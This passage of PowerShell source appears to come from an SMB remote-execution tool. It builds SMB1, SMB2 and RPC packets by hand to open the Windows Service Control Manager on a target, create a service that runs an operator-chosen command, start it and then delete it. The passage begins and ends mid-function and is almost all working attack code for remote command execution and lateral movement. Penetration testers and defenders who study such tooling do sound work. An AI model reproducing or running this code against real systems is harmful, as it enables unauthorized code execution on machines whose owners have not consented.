                            $stage = 'CreateServiceW_Middle'

                        }

                    }

                    'CreateServiceW_Middle'

                    {

                        $SMB_split_stage++

                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)

                        {

                            $packet_SMB_header["Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["Signature"] = $SMB_signing_sequence

                        }

                        $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]

                        $SMB_split_index_tracker += $SMB_split_index

                        $packet_RPC_data = New-PacketRPCRequest 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle

                        $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data     

                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($SMB_split_stage -ge $SMB_split_stage_final)

                        {

                            $stage = 'CreateServiceW_Last'

                        }

                        else

                        {

                            $stage = 'CreateServiceW_Middle'

                        }

                    }

                    'CreateServiceW_Last'

                    {

                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x48 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)

                        {

                            $packet_SMB_header["Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["Signature"] = $SMB_signing_sequence

                        }

                        $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]

                        $packet_RPC_data = New-PacketRPCRequest 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        $stage = 'ReadAndXRequest'

                        $stage_next = 'StartServiceW'

                    }

                    'DeleteServiceW'

                    { 

                        if([System.BitConverter]::ToString($client_receive[88..91]) -eq '1d-04-00-00')

                        {

                            Write-Output "[+] Command executed with service $SMB_service on $Target"

                        }

                        elseif([System.BitConverter]::ToString($client_receive[88..91]) -eq '02-00-00-00')

                        {

                            Write-Output "[-] Service $SMB_service failed to start on $Target"

                        }

                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)

                        {

                            $packet_SMB_header["Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["Signature"] = $SMB_signing_sequence

                        }

                        $packet_SCM_data = New-PacketSCMDeleteServiceW $SMB_service_context_handle

                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 

                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        $stage = 'ReadAndXRequest'

                        $stage_next = 'CloseServiceHandle'

                        $SMB_close_service_handle_stage = 1

                    }

                    'Logoff'

                    {

                        $packet_SMB_header = New-PacketSMBHeader 0x74 0x18 0x07,0xc8 0x34,0xfe $process_ID $SMB_user_ID

                        if($SMB_signing)

                        {

                            $packet_SMB_header["Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["Signature"] = $SMB_signing_sequence

                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = New-PacketSMBLogoffAndXRequest

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data 

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        $stage = 'Exit'

                    }

                    'OpenSCManagerW'

                    {

                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)

                        {

                            $packet_SMB_header["Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["Signature"] = $SMB_signing_sequence

                        }

                        $packet_SCM_data = New-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length

                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 

                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        $stage = 'ReadAndXRequest'

                        $stage_next = 'CheckAccess'           

                    }

                    'ReadAndXRequest'

                    {

                        Start-Sleep -m $Sleep

                        $packet_SMB_header = New-PacketSMBHeader 0x2e 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)

                        {

                            $packet_SMB_header["Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["Signature"] = $SMB_signing_sequence

                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = New-PacketSMBReadAndXRequest $SMB_FID

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data 

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        $stage = $stage_next

                    }

                    'RPCBind'

                    {

                        $SMB_FID = $client_receive[42,43]

                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)

                        {

                            $packet_SMB_header["Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["Signature"] = $SMB_signing_sequence

                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        $packet_RPC_data = New-PacketRPCBind 0x48,0x00 1 0x01 0x00,0x00 $named_pipe_UUID 0x02,0x00

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        $stage = 'ReadAndXRequest'

                        $stage_next = 'OpenSCManagerW'

                    }

                    'StartServiceW'

                    {

                        if([System.BitConverter]::ToString($client_receive[112..115]) -eq '00-00-00-00')

                        {

                            Write-Verbose "Service $SMB_service created on $Target"

                            $SMB_service_context_handle = $client_receive[92..111]

                            $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                            if($SMB_signing)

                            {

                                $packet_SMB_header["Flags2"] = 0x05,0x48

                                $SMB_signing_counter = $SMB_signing_counter + 2 

                                [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                                $packet_SMB_header["Signature"] = $SMB_signing_sequence

                            }

                            $packet_SCM_data = New-PacketSCMStartServiceW $SMB_service_context_handle

                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00

                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                            $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)

                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                            $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)

                            {

                                $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                                $SMB_signature = $MD5.ComputeHash($SMB_sign)

                                $SMB_signature = $SMB_signature[0..7]

                                $packet_SMB_header["Signature"] = $SMB_signature

                                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                            }

                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                            Write-Verbose "[*] Trying to execute command on $Target"

                            $client_stream.Write($client_send,0,$client_send.Length) > $null

                            $client_stream.Flush()

                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            $stage = 'ReadAndXRequest'

                            $stage_next = 'DeleteServiceW'  

                        }

                        elseif([System.BitConverter]::ToString($client_receive[112..115]) -eq '31-04-00-00')

                        {

                            Write-Output "[-] Service $SMB_service creation failed on $Target"

                            $stage = 'Exit'

                        }

                        else

                        {

                            Write-Output "[-] Service creation fault context mismatch"

                            $stage = 'Exit'

                        }

                    }

                    'TreeConnectAndXRequest'

                    {

                        $packet_SMB_header = New-PacketSMBHeader 0x75 0x18 0x01,0x48 0xff,0xff $process_ID $SMB_user_ID

                        if($SMB_signing)

                        {

                            $MD5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider

                            $packet_SMB_header["Flags2"] = 0x05,0x48

                            $SMB_signing_counter = 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["Signature"] = $SMB_signing_sequence

                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = New-PacketSMBTreeConnectAndXRequest $SMB_path_bytes

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data 

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        $stage = 'CreateAndXRequest'

                    }

                    'TreeDisconnect'

                    {

                        $packet_SMB_header = New-PacketSMBHeader 0x71 0x18 0x07,0xc8 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)

                        {

                            $packet_SMB_header["Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["Signature"] = $SMB_signing_sequence

                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = New-PacketSMBTreeDisconnectRequest

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data 

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        $stage = 'Logoff'

                    }

                }

            }

        }  

        else

        {

            $stage = 'TreeConnect'

            try

            {

                while ($stage -ne 'Exit')

                {

                    switch ($stage)

                    {

                        'CheckAccess'

                        {

                            if([System.BitConverter]::ToString($client_receive[128..131]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($client_receive[108..127]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')

                            {

                                $SMB_service_manager_context_handle = $client_receive[108..127]

                                if($SMB_execute -eq $true)

                                {

                                    Write-Verbose "$output_username has Service Control Manager write privilege on $Target"

                                    $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes

                                    $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                                    if($SCM_data.Length -lt $SMB_split_index)

                                    {

                                        $stage = 'CreateServiceW'

                                    }

                                    else

                                    {

                                        $stage = 'CreateServiceW_First'

                                    }

                                }

                                else

                                {

                                    Write-Output "[+] $output_username has Service Control Manager write privilege on $Target"

                                    $SMB_close_service_handle_stage = 2

                                    $stage = 'CloseServiceHandle'

                                }

                            }

                            elseif([System.BitConverter]::ToString($client_receive[128..131]) -eq '05-00-00-00')

                            {

                                Write-Output "[-] $output_username does not have Service Control Manager write privilege on $Target"

                                $stage = 'Exit'

                            }

                            else

                            {

                                Write-Output "[-] Something went wrong with $Target"

                                $stage = 'Exit'

                            }

                        }

                        'CloseRequest'

                        {

                            $stage_current = $stage

                            $message_ID++

                            $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)

                            {

                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      

                            }

                            $packet_SMB2_data = New-PacketSMB2CloseRequest $file_ID

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)

                            {

                                $SMB2_sign = $SMB2_header + $SMB2_data

                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                                $SMB2_signature = $SMB2_signature[0..15]

                                $packet_SMB2_header["Signature"] = $SMB2_signature

                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                            $stage = 'SendReceive'

                        }

                        'CloseServiceHandle'

                        {

                            if($SMB_close_service_handle_stage -eq 1)

                            {

                                Write-Verbose "Service $SMB_service deleted on $Target"

                                $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_context_handle

                            }

                            else

                            {

                                $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle

                            }

                            $SMB_close_service_handle_stage++

                            $stage_current = $stage

                            $message_ID++

                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)

                            {

                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      

                            }

                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x00,0x00

                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 

                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)     

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 

                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)

                            {

                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                                $SMB2_signature = $SMB2_signature[0..15]

                                $packet_SMB2_header["Signature"] = $SMB2_signature

                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                            $stage = 'SendReceive'

                        }

                        'CreateRequest'

                        {

                            $stage_current = $stage

                            $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl

                            $message_ID++

                            $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)

                            {

                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      

                            }

                            $packet_SMB2_data = New-PacketSMB2CreateRequestFile $SMB_named_pipe_bytes

                            $packet_SMB2_data["Share_Access"] = 0x07,0x00,0x00,0x00  

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)

                            {

                                $SMB2_sign = $SMB2_header + $SMB2_data  

                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                                $SMB2_signature = $SMB2_signature[0..15]

                                $packet_SMB2_header["Signature"] = $SMB2_signature

                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                            try

                            {

                                $client_stream.Write($client_send,0,$client_send.Length) > $null

                                $client_stream.Flush()

                                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                                if(Get-StatusPending $client_receive[12..15])

                                {

                                    $stage = 'StatusPending'

                                }

                                else

                                {

                                    $stage = 'StatusReceived'

                                }

                            }

                            catch

                            {

                                Write-Output "[-] Session connection is closed"

                                $stage = 'Exit'

                            }                    

                        }

                        'CreateServiceW'

                        {

                            $stage_current = $stage

                            $message_ID++

                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)

                            {

                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      

                            }

                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00

                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)

                            {

                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                                $SMB2_signature = $SMB2_signature[0..15]

                                $packet_SMB2_header["Signature"] = $SMB2_signature

                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                            $stage = 'SendReceive'

                        }

                        'CreateServiceW_First'

                        {

                            $stage_current = $stage

                            $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)

                            $message_ID++

                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)

                            {

                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      

                            }

                            $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]

                            $packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first

                            $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length)

                            $SMB_split_index_tracker = $SMB_split_index

                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 

                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 

                            $RPC_data_length = $SMB2_data.Length + $RPC_data.Length

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)

                            {

                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data

                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                                $SMB2_signature = $SMB2_signature[0..15]

                                $packet_SMB2_header["Signature"] = $SMB2_signature

                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data

                            $stage = 'SendReceive'

                        }

                        'CreateServiceW_Middle'

                        {

                            $stage_current = $stage

                            $SMB_split_stage++

                            $message_ID++

